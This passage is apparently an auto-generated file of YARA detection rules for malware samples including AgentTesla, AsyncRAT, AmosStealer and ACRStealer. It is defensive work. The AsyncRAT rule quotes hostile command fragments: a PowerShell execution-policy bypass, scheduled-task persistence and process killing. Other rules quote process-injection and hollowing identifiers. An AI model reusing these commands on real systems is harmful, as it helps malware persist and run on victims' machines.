      $s8 = "_getBuffer" fullword ascii /* score: '9.00'*/
      $s9 = "?-'~#4#6`" fullword ascii /* score: '9.00'*/ /* hex encoded string 'F' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5937747b {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5937747b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5937747b1eccd2bf0b8faa9f98109d0395f65f8dc9e8392396b0084bd4828618"
   strings:
      $s1 = "Lsioifq.exe" fullword wide /* score: '22.00'*/
      $s2 = "ELsioifq, Version=1.0.6780.19130, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "Unsupported hash size." fullword wide /* score: '10.00'*/
      $s4 = ",,,:!!!" fullword ascii /* score: '10.00'*/
      $s5 = "ComputeDerivedKey" fullword ascii /* score: '10.00'*/
      $s6 = "777S!!!" fullword ascii /* score: '10.00'*/
      $s7 = "getBuffer" fullword wide /* score: '9.00'*/
      $s8 = "GetEffectivePbkdf2Salt" fullword ascii /* score: '9.00'*/
      $s9 = "_getBuffer" fullword ascii /* score: '9.00'*/
      $s10 = "get_Rnorrjimu" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule aa0340651089c88231a6751eba2fb08bd40da2e7670384b301ee835d75eaa555_aa034065 {
   meta:
      description = "_subset_batch - file aa0340651089c88231a6751eba2fb08bd40da2e7670384b301ee835d75eaa555_aa034065.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aa0340651089c88231a6751eba2fb08bd40da2e7670384b301ee835d75eaa555"
   strings:
      $s1 = "Remote I/O error" fullword ascii /* score: '10.00'*/
      $s2 = "#$%&'()*+,234567" fullword ascii /* score: '9.00'*/ /* hex encoded string '#Eg' */
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule sig_9de2606cfa0aa0d2eef8afd2762e167e497e35b354a69c03cbb6b907cec1bd6b_9de2606c {
   meta:
      description = "_subset_batch - file 9de2606cfa0aa0d2eef8afd2762e167e497e35b354a69c03cbb6b907cec1bd6b_9de2606c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9de2606cfa0aa0d2eef8afd2762e167e497e35b354a69c03cbb6b907cec1bd6b"
   strings:
      $s1 = "__vdso_clock_gettime" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule a2f1713fe7b19d0edf6f36ffa30b4db79ea1bf318187ac7c0a5d59749c7ea84e_a2f1713f {
   meta:
      description = "_subset_batch - file a2f1713fe7b19d0edf6f36ffa30b4db79ea1bf318187ac7c0a5d59749c7ea84e_a2f1713f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a2f1713fe7b19d0edf6f36ffa30b4db79ea1bf318187ac7c0a5d59749c7ea84e"
   strings:
      $s1 = "Failed to create symlink in %s: %s" fullword ascii /* score: '12.50'*/
      $s2 = "Remote I/O error" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule AmosStealer_signature_ {
   meta:
      description = "_subset_batch - file AmosStealer(signature).macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "39b9ad7eac5346d9492ca3481924bad4701e6be8a8e35aa2b7dad3b7ecb21738"
   strings:
      $s1 = "__mh_execute_header" fullword ascii /* score: '19.00'*/
      $s2 = "swintus" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeca and filesize < 5000KB and
      all of them
}

rule AmosStealer_signature__b27e4320 {
   meta:
      description = "_subset_batch - file AmosStealer(signature)_b27e4320.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b27e43206e0998dfb09e588c80ba6d4c0c4fcae9c52d24d2a5e0196cba438272"
   strings:
      $s1 = "__mh_execute_header" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0xfacf and filesize < 2000KB and
      all of them
}

rule aa84261665380ec86d7ca0083cd23e8bcf948aae3a008272485484b3eff53796_aa842616 {
   meta:
      description = "_subset_batch - file aa84261665380ec86d7ca0083cd23e8bcf948aae3a008272485484b3eff53796_aa842616.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aa84261665380ec86d7ca0083cd23e8bcf948aae3a008272485484b3eff53796"
   strings:
      $x1 = "(function(_0x13ffaa,_0x501f6b){var _0x43f362=a1_0x16b3,_0x3ec7e7=_0x13ffaa();while(!![]){try{var _0x220e8f=parseInt(_0x43f362(0x" ascii /* score: '39.00'*/
      $s2 = "dWhlZ28vdWZhbzgjY2xlZ2NxPiJ0cDgsInducmFrciEsVnFoZWZsdE9PV15ET01AV3B1Y2NrQG1icWZsZ25saWNwa3BpYGVmc1NtdnNhZXdxZFJzb2ZxYW1qbm1mcEll" ascii /* base64 encoded string 'uhego/ufao8#clegcq>"tp8,"wnrakr!,VqhefltOOW^DOM@Wpucck@mbqflgnlicpkpi`efsSmvsaewqdRsofqamjnmfpIe' */ /* score: '21.00'*/
      $s3 = "dWR4dXZxZ15laGx1ZnNdYm1rc2x2c2xxa2MkcWZyZ25xbWJvYWVPUVVLR2x0aWtiRXZvYHVrbm1vbXdxZWZsdWZxQnVibHdFYnBlZkNqQFdlZHRVaW1lb213cWVvbnVm" ascii /* base64 encoded string 'udxuvqg^ehlufs]bmkslvslqkc$qfrgnqmboaeOQUKGltikbEvo`uknmomwqeflufqBublwEbpefCj@WedtUimeomwqeonuf' */ /* score: '21.00'*/
      $s4 = "QXZmZWZwZWdzYnFocHVrbm9VZmFDc3FlbmBteWBwcG15QHFicWJpaHVhTFdlZHdRdHBzbnB1ZGVEeHVmb3Frbm9wcG13ZWpvcXdxZnFDZWZsdFFGU1FLUFVGTFdxZG1m" ascii /* base64 encoded string 'AvfefpegsbqhpuknoUfaCsqen`my`ppmy@qbqbihuaLWedwQtpsnpudeDxufoqknoppmwejoqwqfqCefltQFSQKPUFLWqdmf' */ /* score: '21.00'*/
      $s5 = "blFgdWtvdWZjZG9cZWpvcHVibHVpYHVkZWp0SWRudWR1a2FiTWV1Z2FgbG93cWZtYmBtZlVmcHVkeUB0dnFqYUJycWF7cHZxam9kI2FjcHY4I2JxZWB1ZUZ1Zmx0J2Bp" ascii /* base64 encoded string 'nQ`ukoufcdo\ejopublui`udejtIdnudukabMeuga`lowqfmb`mfUfpudy@tvqjaBrqa{pvqjod#acpv8#bqe`ueFuflt'`i' */ /* score: '21.00'*/
      $s6 = "ZWB1a25taHVlbGduT2x0VnFjY2s2MHB5bXRsdWhwbXpmcWVxdWZvYXhJS0RLXUpMVHNtY1xxRVZTT1BVSE1FYWhoPWpmcWFtZCNyc2Bnb2E9Mjw/LWpmcWFtZj5hamxm" ascii /* base64 encoded string 'e`uknmhuelgnOltVqcck60pymtluhpmzfqequfoaxIKDK]JLTsmc\qEVSOPUHMEahh=jfqamd#rs`goa=2<?-jfqamf>ajlf' */ /* score: '21.00'*/
      $s7 = "XU1AU1xVRFhVVlFHX1FKWUdfX3VmYGZxanVmc19zYnFocHdeZm9icWVgdWVAdHZxamF0dWVkeHVmcm1gb2VkdVZtamducWxPb2FgdWtub3F3cHFmbGVkZXZtamducW9O" ascii /* base64 encoded string ']M@S\UDXUVQG_QJYG__uf`fqjufs_sbqhpw^fobqe`ue@tvqjatuedxufrm`oeduVmjgnqlOoa`uknoqwpqfledevmjgnqoN' */ /* score: '21.00'*/
      $s8 = "a2RodU1AW15RRkxFRlJBVkZFRlNfUUpZRmVobG9QdXhtZmVqbWBsbXpzZmAqMTU0LjE1NCwxKWJ1YWhsSWVrZGh1Zm1iYG1kZFBtd2VqbnVgbXVncG9tYGVqbHVmcnNv" ascii /* base64 encoded string 'kdhuM@[^QFLEFRAVFEFS_QJYFehloPuxmfejm`lmzsf`*154.154,1)buahlIekdhufmb`mddPmwejnu`mugpom`ejlufrso' */ /* score: '21.00'*/
      $s9 = "YnNDbGVlQHZhY3FmUWVvbnVnQGlobGddZDYxMmJiMTtgdmttam1qbGVke05lY2B1dWBuQ212bGVqb2ZDbHpRa2RodU1aUUlARFJTTnVgbXVncHVicHZJdWthZUhXOzs6" ascii /* base64 encoded string 'bsClee@vacqfQeonug@ihlg]d612bb1;`vkmjmjled{Nec`uu`nCmvlejofClzQkdhuMZQI@DRSNu`mugpubpvIukaeHW;;:' */ /* score: '21.00'*/
      $s10 = "S1NOTUF0ZWtvX1FkbWZtaXVvXUhFR15RZ2NucGVmc2NtbHFobWdQaWBlZnBmcWp1ZnFibHVpYG1pY3FpbHBtZW1mbHVgdWtub3FkdFVpbWdtdHZ1aGVnbU9OW11EWFdc" ascii /* base64 encoded string 'KSNMAteko_Qdmfmiuo]HEG^QgcnpefscmlqhmgPi`efpfqjufqblui`micqilpmemflu`uknoqdtUimgmtvuhegmON[]DXW\' */ /* score: '21.00'*/
      $s11 = "aW1qb2QlMW1tbW1tbW1sbG1oc25wd1hddGQ4MDEsXXRmYmZlXCRFZnVgblZQW0B2cG4sRWZ1YG5WUFtAdnBuLTJVRlBVRFtfUElARUZTbm9jbWxwbWR1ZU1AW19BVkFH" ascii /* base64 encoded string 'imjod%1mmmmmmmllmhsnpwX]td801,]tfbfe\$Efu`nVP[@vpn,Efu`nVP[@vpn-2UFPUD[_PI@EFSnocmlpmdueM@[_AVAG' */ /* score: '21.00'*/
      $s12 = "cClpPDM5aD03OWsrKSt6cWdxdGx3cyk9azl9amQqaSYxPTwxK3pxZ3F0bHdzKT8zOnFkdXZybCJxZ3F0bHdzOX1kb3FnenFkdXZybCJxZ3F0bHc5fX1gZGVGdWZsdE1r" ascii /* base64 encoded string 'p)i<39h=79k+)+zqgqtlws)=k9}jd*i&1=<1+zqgqtlws)?3:qduvrl"qgqtlws9}doqgzqduvrl"qgqtlw9}}`deFufltMk' */ /* score: '21.00'*/
      $s13 = "bWl1bS1mdWBtdWB1ZWBwcmVobHVmc2FibnVjc2Vkd092bFJzbHFmcHV4RWdzYnFocHducl9fWWEueUEuWVxmcWN1QnJxYXtzcHdscUpsdWZybWBsZXdjaGV3Y2tnbWJj" ascii /* base64 encoded string 'mium-fu`mu`ue`prehlufsabnucsedwOvlRslqfpuxEgsbqhpwnr__Ya.yA.Y\fqcuBrqa{spwlqJlufrm`lewchewckgmbc' */ /* score: '21.00'*/
      $s14 = "bFFgdGlgcHJNYW1lVm1qdWZzc0FFNTVNZGVpdWxzbWFvbXdxZGdvdm51aGVnby9vZ2c4I2NsZWdjcT4gdGlnbnFiIm9ubWZGUUNFTUZMV19QSUBFRlFvbXdxZ251ZnB1" ascii /* base64 encoded string 'lQ`ti`prMameVmjufssAE55Mdeiulsmaomwqdgovnuhego/ogg8#clegcq> tignqb"onmfFQCEMFLW_PI@EFQomwqgnufpu' */ /* score: '21.00'*/
      $s15 = "bXR2OmBtYm9rUWdnbWVVSE1rZGh0dWR4d05iaWdgdWh1ZW9RanlnYGpzbW1kV213YGlGdWZsdmNsZXlEWFdcdWR4dXZxZ15laGx1ZnNdYm1rc2x2c2xxa2JFdHV2cWJD" ascii /* base64 encoded string 'mtv:`mbokQggmeUHMkdhtudxwNbig`uhueoQjyg`jsmmdWmw`iFuflvcleyDXW\udxuvqg^ehlufs]bmkslvslqkbEtuvqbC' */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 800KB and
      1 of ($x*) and 4 of them
}

rule ACRStealer_signature_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature).rtf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d873740da0b90df1717f7710ff094110497f5d92a04aa0acbb56e18e04a38975"
   strings:
      $s1 = "5a73315a7b21527321526b29526b395a73213952" ascii /* score: '19.00'*/ /* hex encoded string 'Zs1Z{!Rs!Rk)Rk9Zs!9R' */
      $s2 = "5a6b4a5a734a5a6b525a734a5a6b4a5a734a5a6b4a5a6b4a5a6b4a5a6b4a5a6b4a5a6b42526b4a" ascii /* score: '17.00'*/ /* hex encoded string 'ZkJZsJZkRZsJZkJZsJZkJZkJZkJZkJZkJZkBRkJ' */
      $s3 = "5273395a7339526b39526b39526b39526b39526b39526b39526342526b394a63395263394a6342" ascii /* score: '17.00'*/ /* hex encoded string 'Rs9Zs9Rk9Rk9Rk9Rk9Rk9Rk9RcBRk9Jc9Rc9JcB' */
      $s4 = "313921293929314221314229394229314231394a29394a29394a29394a29395229394a31425229" ascii /* score: '17.00'*/ /* hex encoded string '19!)9)1B!1B)9B)1B19J)9J)9J)9J)9R)9J1BR)' */
      $s5 = "637b4a637b4a63734a637b4a5a734a637b4a5a734a637b4a5a734a63734a5a734a6373425a734a" ascii /* score: '17.00'*/ /* hex encoded string 'c{Jc{JcsJc{JZsJc{JZsJc{JZsJcsJZsJcsBZsJ' */
      $s6 = "5a73425a6b4a5a73425a6b4a5a73425a6b4a5a73425a6b4a5a73425a6b4a5a73425a6b425a7342" ascii /* score: '17.00'*/ /* hex encoded string 'ZsBZkJZsBZkJZsBZkJZsBZkJZsBZkJZsBZkBZsB' */
      $s7 = "4a6331425a394a5a31425a394a6331425a394a63314a5a394a63314a5a394a63314a6339526b31" ascii /* score: '17.00'*/ /* hex encoded string 'Jc1BZ9JZ1BZ9Jc1BZ9Jc1JZ9Jc1JZ9Jc1Jc9Rk1' */
      $s8 = "395a31526b294263" ascii /* score: '17.00'*/ /* hex encoded string '9Z1Rk)Bc' */
      $s9 = "394229314231394a29394a31394a29394a29395229394a31425231395231425a293952394a5a31" ascii /* score: '17.00'*/ /* hex encoded string '9B)1B19J)9J19J)9J)9R)9J1BR19R1BZ)9R9JZ1' */
      $s10 = "526b42527339526b425a6b42526b425a6b42526b4a5a6b42526b425a6b42526b4a5a6b42526b4a" ascii /* score: '17.00'*/ /* hex encoded string 'RkBRs9RkBZkBRkBZkBRkJZkBRkBZkBRkJZkBRkJ' */
      $s11 = "526b425a73425a73425a6b42526b42526b394a6339526339526339526b39526b425a7b395a7b42" ascii /* score: '17.00'*/ /* hex encoded string 'RkBZsBZsBZkBRkBRk9Jc9Rc9Rc9Rk9RkBZ{9Z{B' */
      $s12 = "637352637352637352637352637352637352637352637352637352637352637352637352637352" ascii /* score: '17.00'*/ /* hex encoded string 'csRcsRcsRcsRcsRcsRcsRcsRcsRcsRcsRcsRcsR' */
      $s13 = "5a6b39526b425a6b42526b42526b39526342526b425263425263424a63425263424a6342526339" ascii /* score: '17.00'*/ /* hex encoded string 'Zk9RkBZkBRkBRk9RcBRkBRcBRcBJcBRcBJcBRc9' */
      $s14 = "5a7352637b52637352637b525a7352637b52637352637b4a637352637b4a637b52637b4a637b52" ascii /* score: '17.00'*/ /* hex encoded string 'ZsRc{RcsRc{RZsRc{RcsRc{JcsRc{Jc{Rc{Jc{R' */
      $s15 = "526b425a73395273395a73395273425a7339527342527339526b42527339526b39526b394a6b39" ascii /* score: '17.00'*/ /* hex encoded string 'RkBZs9Rs9Zs9RsBZs9RsBRs9RkBRs9Rk9Rk9Jk9' */
   condition:
      uint16(0) == 0x5c7b and filesize < 23000KB and
      8 of them
}

rule AsyncRAT_signature_ {
   meta:
      description = "_subset_batch - file AsyncRAT(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2047f2ac8ea746c12b7cda5259be5b0ff3dc9d9ee0c047a7048a6f5e17f677c5"
   strings:
      $x1 = "objShell.Run(\"Powershell -ExecutionPolicy Bypass $usefont='ReadAllText';$egbus='C:\\Users\\Public\\Music\\/GLKIIGFMHA.NRXED';IE" ascii /* score: '56.00'*/
      $x2 = "objShell.Run(\"Powershell -ExecutionPolicy Bypass $usefont='ReadAllText';$egbus='C:\\Users\\Public\\Music\\/GLKIIGFMHA.NRXED';IE" ascii /* score: '56.00'*/
      $x3 = "objShell.Run \"schtasks /Create /XML C:\\Users\\Public\\Music\\GLKIIGFMHA.xml /TN \"\"devil\"\"\", 0" fullword ascii /* score: '47.00'*/
      $x4 = ": Remove-Item -Path \"C:\\Users\\Public\\Music\\*.vbs\",\"C:\\Users\\Public\\Music\\*.xml\",\"C:\\Users\\Public\\Music\\*.NRXED" ascii /* score: '38.00'*/
      $x5 = ": Remove-Item -Path \"C:\\Users\\Public\\Music\\*.vbs\",\"C:\\Users\\Public\\Music\\*.xml\",\"C:\\Users\\Public\\Music\\*.NRXED" ascii /* score: '38.00'*/
      $x6 = "[IO.File]::WriteAllText(\"C:\\Users\\Public\\Music\\XLVRAQIMST.vbs\", $RunTaskVBS)" fullword ascii /* score: '34.00'*/
      $x7 = "      <Command>C:\\Users\\Public\\Music\\//GLKIIGFMHA.vbs</Command>" fullword ascii /* score: '34.00'*/
      $x8 = "cscript //nologo \"C:\\Users\\Public\\Music\\XLVRAQIMST.vbs\"" fullword ascii /* score: '34.00'*/
      $x9 = "[IO.File]::WriteAllText(\"C:\\Users\\Public\\Music\\/GLKIIGFMHA.xml\", $Content)" fullword ascii /* score: '32.00'*/
      $x10 = "[IO.File]::WriteAllText(\"C:\\Users\\Public\\Music\\/GLKIIGFMHA.vbs\", $FontPack)" fullword ascii /* score: '31.00'*/
      $s11 = "objShell.Run \"schtasks /run /tn \"\"devil\"\"\", 0" fullword ascii /* score: '27.00'*/
      $s12 = "[IO.File]::WriteAllText(\"C:\\Users\\Public\\Music\\/GLKIIGFMHA.NRXED\", $FontPack)" fullword ascii /* score: '24.00'*/
      $s13 = "taskkill /IM jsc.exe /F" fullword ascii /* score: '22.00'*/
      $s14 = "taskkill /IM aspnet_compiler.exe /F" fullword ascii /* score: '22.00'*/
      $s15 = "http://schemas.microsoft.com/powershell/Microsoft.PowerShell" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x88e2 and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2916bffe {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2916bffe.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2916bffe78f4e2f157285a37c266d23fd9158c5517bbf138c565d8429d2b7572"
   strings:
      $s1 = "ERPw.exe" fullword wide /* score: '22.00'*/
      $s2 = "ERPw.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "rotavitcA.metsyS" fullword wide /* reversed goodware string 'System.Activator' */ /* score: '13.00'*/
      $s4 = "Export Complete" fullword wide /* score: '12.00'*/
      $s5 = "SetBinaryOperation" fullword ascii /* score: '12.00'*/
      $s6 = "{0:HH:mm:ss} - {1}" fullword wide /* score: '12.00'*/
      $s7 = "Text files (*.txt)|*.txt|All files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s8 = "Calculator Plus - History Export" fullword wide /* score: '11.00'*/
      $s9 = "Error exporting history: " fullword wide /* score: '10.00'*/
      $s10 = "TxQN:\\" fullword ascii /* score: '10.00'*/
      $s11 = "LogBase10" fullword ascii /* score: '10.00'*/
      $s12 = "CalculatorHistory_{0:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '10.00'*/
      $s13 = "set_Operand1" fullword ascii /* score: '9.00'*/
      $s14 = "CreateOperatorButtons" fullword ascii /* score: '9.00'*/
      $s15 = "set_Operand2" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_9cad62a76b2dc6cbe0da94dd9ae5c964ae0d62e804740e2a4a0c607a5e2cdcd8_9cad62a7 {
   meta:
      description = "_subset_batch - file 9cad62a76b2dc6cbe0da94dd9ae5c964ae0d62e804740e2a4a0c607a5e2cdcd8_9cad62a7.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9cad62a76b2dc6cbe0da94dd9ae5c964ae0d62e804740e2a4a0c607a5e2cdcd8"
   strings:
      $s1 = "\\Allthingsdll_64.dll" fullword ascii /* score: '21.00'*/
      $s2 = "Allthingsdll_64.dll" fullword wide /* score: '20.00'*/
      $s3 = "dllguest.Bypass" fullword ascii /* score: '18.00'*/
      $s4 = "AllTheThingsx86.dllPK" fullword ascii /* score: '16.00'*/
      $s5 = "AllTheThingsx86.dllup" fullword ascii /* score: '16.00'*/
      $s6 = "AllTheThingsx86.dllMZ" fullword ascii /* score: '16.00'*/
      $s7 = "ExecParam" fullword ascii /* score: '16.00'*/
      $s8 = "I shouldn't really execute" fullword wide /* score: '14.00'*/
      $s9 = "I shouldn't really execute either." fullword wide /* score: '14.00'*/
      $s10 = "Allthingsdll_64" fullword wide /* score: '9.00'*/
      $s11 = "Hello There From Uninstall" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 20KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__730ebab2 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_730ebab2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "730ebab239774a3efa19746a887c8ac39c2e17841bbbe38caf07df9e6b82bb47"
   strings:
      $x1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s3 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s4 = "vJiGl01UUJfXfNWas3.DyyVDbaRvM1YfIq9il+AXBrnIFfMAfABnJrF9+z0oyxsqySXMDuI4ZyY`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '27.00'*/
      $s5 = "InjectIntoProcess" fullword ascii /* score: '25.00'*/
      $s6 = "ProcessInjectionUtility" fullword ascii /* score: '25.00'*/
      $s7 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s8 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s9 = "ExecutePayload" fullword ascii /* score: '22.00'*/
      $s10 = "order1.exe" fullword wide /* score: '22.00'*/
      $s11 = "vJiGl01UUJfXfNWas3.DyyVDbaRvM1YfIq9il+AXBrnIFfMAfABnJrF9+z0oyxsqySXMDuI4ZyY`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '18.00'*/
      $s12 = "processAttributes" fullword ascii /* score: '15.00'*/
      $s13 = "PreprocessInput" fullword ascii /* score: '15.00'*/
      $s14 = "ProcessCreationFlags" fullword ascii /* score: '15.00'*/
      $s15 = "ProcessHollowing" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__742d9da9 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_742d9da9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "742d9da924716716f8225b37b5a0c6ef34bb99b08eea5dc73144eab6d036e49c"
   strings:
      $x1 = "sYgcdvgJl/SfqIMcHzF0kj0tesjCUv5pgTjmsNcULhRKwEY7gI9t41Ag26FqEWfqWNwqwB3hTrE2t/r9naarU4Ihm4EFhOm9vTdAgpVVfBPYBdzVkvHb949lssWbckdT" wide /* score: '58.00'*/
      $s2 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s3 = "purr.exe" fullword wide /* score: '22.00'*/
      $s4 = "YjE2ZDQ3aW1rNnB2YWJ0Yw==" fullword wide /* base64 encoded string 'b16d47imk6pvabtc' */ /* score: '14.00'*/
      $s5 = "WnYvMkZKN2p0UHpzYkxYVg==" fullword wide /* base64 encoded string 'Zv/2FJ7jtPzsbLXV' */ /* score: '14.00'*/
      $s6 = "PerformInjection" fullword ascii /* score: '14.00'*/
      $s7 = "hostPath" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1e06f859 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1e06f859.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1e06f8596434f32ae1a944e9bec938729e9420a3dfab02d087e4f25569e4c368"
   strings:
      $s1 = "Ceketvutc.exe" fullword wide /* score: '22.00'*/
      $s2 = "GCeketvutc, Version=1.0.1095.20338, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "appguid={8A69D345-D564-463C-AFF1-A69D9E530F96}&iid={CD3C7EDE-16BD-453E-CB46-FD11F0E9FF3C}&lang=en&browser=4&usagestats=1&appname" ascii /* score: '9.00'*/
      $s4 = "get_Nqoljdzayg" fullword ascii /* score: '9.00'*/
      $s5 = "appguid={8A69D345-D564-463C-AFF1-A69D9E530F96}&iid={CD3C7EDE-16BD-453E-CB46-FD11F0E9FF3C}&lang=en&browser=4&usagestats=1&appname" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6a58063f {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6a58063f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6a58063fd4bfe4c9fd2bb7b17216fe3353a358a404d8b162d8b6f2a9bfc7b625"
   strings:
      $s1 = "Zlsrrrmdb.exe" fullword wide /* score: '22.00'*/
      $s2 = "FZlsrrrmdb, Version=1.0.4418.1092, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "Atdlljwk" fullword ascii /* score: '11.00'*/
      $s4 = "wtEMPP8z" fullword ascii /* score: '11.00'*/
      $s5 = "GKcSK.RBO" fullword ascii /* score: '10.00'*/
      $s6 = "get_Tvfbspc" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule afdc8317dc5a474dc57175fafed280aa189b1f8a8449a27ff3c292cd7c53fe8c_afdc8317 {
   meta:
      description = "_subset_batch - file afdc8317dc5a474dc57175fafed280aa189b1f8a8449a27ff3c292cd7c53fe8c_afdc8317.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "afdc8317dc5a474dc57175fafed280aa189b1f8a8449a27ff3c292cd7c53fe8c"
   strings:
      $x1 = "TableTypeColumnIdentifier_ValidationValueNPropertyId_SummaryInformationDescriptionSetCategoryKeyTableMaxValueNullableKeyColumnMi" ascii /* score: '61.00'*/
      $x2 = ".If the expression syntax is invalid, the engine will terminate, returning iesBadActionData.SequenceNumber that determines the s" ascii /* score: '41.00'*/
      $x3 = "dminUISequenceAdvtExecuteSequenceComponentPrimary key used to identify a particular component record.ComponentIdGuidA string GUI" ascii /* score: '31.00'*/
      $s4 = "35-BDF4F3E57D48}SetZUBOoaCSCf[%LOCALAPPDATA]\\CWwIZuZRlDAZpwOTARGETDIR[%LOCALAPPDATA]\\CWwIZuZ\\cnmpaui.exe.SourceDirMainProgran" ascii /* score: '27.00'*/
      $s5 = "dows Installercnmpaui.exe0.3.0.01033cnmpaui.dllcnmplog.datValidateProductIDProcessComponentsUnpublishFeaturesRemoveFilesRegister" ascii /* score: '27.00'*/
      $s6 = "lumnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression whi" ascii /* score: '23.00'*/
      $s7 = "ort order in which the actions are to be executed.  Leave blank to suppress action.AdminUISequenceAdvtExecuteSequenceComponentPr" ascii /* score: '21.00'*/
      $s8 = "imary key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and lan" ascii /* score: '20.00'*/
      $s9 = "with respect to the media images; order must track cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, " ascii /* score: '20.00'*/
      $s10 = "InstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProductzVFBIbjM" ascii /* score: '18.00'*/
      $s11 = "om the Directory table.AttributesRemote execution option, one of irsEnumA conditional statement that will disable this component" ascii /* score: '18.00'*/
      $s12 = "ionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress action.A" ascii /* score: '17.00'*/
      $s13 = "me of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;Langu" ascii /* score: '17.00'*/
      $s14 = "tem.TitleShort text identifying a visible feature item.Longer descriptive text descr" fullword ascii /* score: '16.00'*/
